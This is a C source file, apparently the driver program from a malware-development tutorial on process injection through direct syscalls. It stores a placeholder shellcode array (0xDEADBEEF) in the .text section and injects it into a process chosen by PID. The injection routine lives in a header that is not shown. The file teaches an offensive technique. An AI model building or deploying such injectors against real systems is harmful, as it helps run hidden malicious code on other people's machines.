/*
---------------------------------------------------------------------------------------
@culprit: crow
@website: https://www.crow.rip/crows-nest/mal/dev/inject/syscalls/direct-syscalls 
@youtube: https://youtu.be/-M2_mZg_2Ew 
---------------------------------------------------------------------------------------
*/

#include "injection.h"

#pragma section(".text")
/* placing our payload in the .text section */
__declspec(allocate(".text")) CONST UCHAR Shellcode[] = {
    0xDE, 0xAD, 0xBE, 0xEF
};

int main(int argc, char* argv[]) {

    if (argc < 2) {
        WARN("usage: \"%s\" [PID]", argv[0]);
        return EXIT_FAILURE;
    }

    if (!DirectSyscallsInjection(
                atoi(argv[1]),
                Shellcode,
                sizeof(Shellcode)
                )) {
        WARN("injection with direct syscalls failed, exiting...");
        return EXIT_FAILURE;
    }

    OKAY("successfully injected process with direct syscalls!");
    return EXIT_SUCCESS;

}
